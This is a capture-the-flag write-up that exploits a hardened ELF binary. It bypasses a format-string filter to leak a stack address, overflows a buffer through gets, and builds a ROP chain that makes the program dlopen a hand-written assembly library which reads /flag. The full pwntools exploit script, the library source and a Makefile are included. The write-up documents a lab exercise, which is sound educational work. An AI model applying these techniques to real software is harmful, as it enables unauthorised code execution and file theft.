---
title: "The Liberated Library"
layout: page
---


- Exploitation
- Buffer Overflow
- C
- X86_64
- Hard

Writeup by `Sasszem`

# Description and resources
## Mission brief
Exploit a simple (well, you will judge this) ELF binary.

## Instructions
As the years are passing by you are getting thirsty for a real challenge. Well, this little binary is not only armoured with your favourite hardening techniques, but also requires a bit of playing with the bits.

We prepared a fully armoured environment to succeed with this challenge, so we installed your favourite tools:
- GDB with PEDA
- Checksec
- Pwntools for python3
- ROPgadget
- vim/nano

Your job is to exploit the `main` executable and get access to the file `/flag`. Enjoy the ride and have fun.

---

# Writeup

Now this one took some time to solve, but it was kinda fun. It was mostly like figuring out the annoying details, not that I did not have a plan.

This binary does the same job as the last one, but a bit differently. First, it's protected against both format string exploits (by some filtering) and also against buffer overflows (by not using `gets`). It does the printing by opening itself as a shared library and executing a function to print to a string then print that string. Pretty fishy I say.

I did not fully reverse the protection against format strings, since I found by looking at the disassembly that it does not properly check every percent sign, so `%%%p` kinda bypassed it. I also later used `%%%2$p` to leak a stack address, and `%115p` to make a long string.

Speaking of long strings, another part was also fishy. It compared the string with a copy made with `memcpy`, and if they differ it ran a different function. Making them not differ was easy, by overflowing a third string using `%115p`. Determining the "115" was some work, as it needed to trigger the bad comparison but not wrack the whole program.

That other function did something interesting: it read into it's own buffer with `gets`. So, BOF protection is also bypassed.

Getting to the solution from there was not easy, and took a long time, so I'll only explain my solution:
- ROP attack
- Go to the part where it loads itself a library, but load another file instead by overriding the parameters
- Then it'll load my code from a SO and exec it
- It needed a few rop gadgets I found with `ropper`
- Making it function was a tedious work with a ton of segfaults
- I had to move the stack frame of `main` so all buffers can fit in
- I ended up making that library in assembly so it won't demand a proper stack because I could not keep that together to that point

Final code:

```python
from pwn import *

# GDB helps w/ debugging
p = process("./main_lib3")
#p = gdb.debug("./main_lib3", '''b main\ncommands\np/x $rbp\nc\nend\nb *stuff+80''')


# get stack pointer
# %%%p bypasses the check of the string, and leaks the address of the current buffer
p.sendline("%%%2$p")
p.recvline()
l = p.recvline()
l = p.recvline()
#print(f"got: '{l}'")

# address of "message" string stored in main's stack frame
message_of_main = eval(l.strip().split(b"'")[-2][1:])

# calculate a few offsetts
# this RBP is used a few times
rbp_of_main = message_of_main+0x120

# pointer of filename to open
# yeah it was experimentations
filename_ptr = rbp_of_main - 0x50 - 432


print(f"rbp to write = 0x{rbp_of_main:x}")
print(f"message entered: 0x{filename_ptr:x}")

# this triggers the "stuff" function which uses gets so we can overflow and just ROP again
p.sendline("%115p")



# Some gadgets
pop_rdi_ret = 0x40172b
pop_rsi_r15 = 0x0401729
single_ret = 0x401016


# sadly, all ROPing messes with the stack a bit
# this causes return addresses overlap with a few arrays we need to use
# so we need to cheat and move them
# this fucks up location of symbol name for dlsym
# but we can place it later
my_rbp = rbp_of_main + 500

symbol_name = b"exploit"



payload = b"./exploitlib.so\0".ljust(10*8, b"A") # filler for overflow + filename to open with dlopen
payload += p64(my_rbp) # fix rbp
payload += p64(pop_rdi_ret) + p64(filename_ptr) # setup filename in rdi (1st param for dlopen)
payload += p64(pop_rsi_r15) + p64(1) + b"X"*8 # r15 is not needed, but rsi needs to be 1 (2nd param of dlopen)
payload += p64(single_ret) # align stack
payload += p64(0x4015BF) # jump to dlopen stuff in main

# after that, it's on autopilot, it'll open my dll, search for the symbol and call it. If that exits, we don't have to care at all about the f-ed up stack
# but we need to craft that library carefuly, bc it must not depend heavily on the stack
# so I did it in asm w/ hand

# also, we moved rbp of main, so we need to add back the symbol name to lookup. No one said it must be the same one...
payload = payload.ljust(1000-52, b"H")+symbol_name


# This is the most important part
p.sendline(payload)
p.interactive()
```

Library:

```x86
section .text

global exploit:function

exploit:
    mov rax, 2 ; open syscall
    mov rdi, filename
    mov rdx, 0
    mov rsi, 0    
    syscall

    mov r8, rax
    ; now rax is the file descriptor
    
    readloop:
        ; read one byte
        mov rax, 0
        mov rdi, r8
        mov rsi, rbp
        mov rdx, 1
        syscall

        ; now [rbp] is a byte read
        ; except when read 0 bytes
        cmp rax, 0
        je exit
    
        ; write one byte to stdout
        mov rax, 1
        mov rdi, 1
        mov rdx, 1
        mov rsi, rbp
        syscall

    jmp readloop

    exit:
        ; clsoe file
        mov rax, 4
        mov rdi, r8
        syscall

        ; exit
        mov rax, 60
        mov rdi, 0
        syscall


section .data
filename:  db        "/flag", 0
```

Makefile:
```Makefile
all: exploitlib.so

%.so: %.o
	gcc --shared -o $@ $<

%.o: %.s
	nasm -f elf64 -o $@ $<

clean:
	-rm ./*.o
	-rm ./*.so
```

Also it should be renamed to `exploiti`.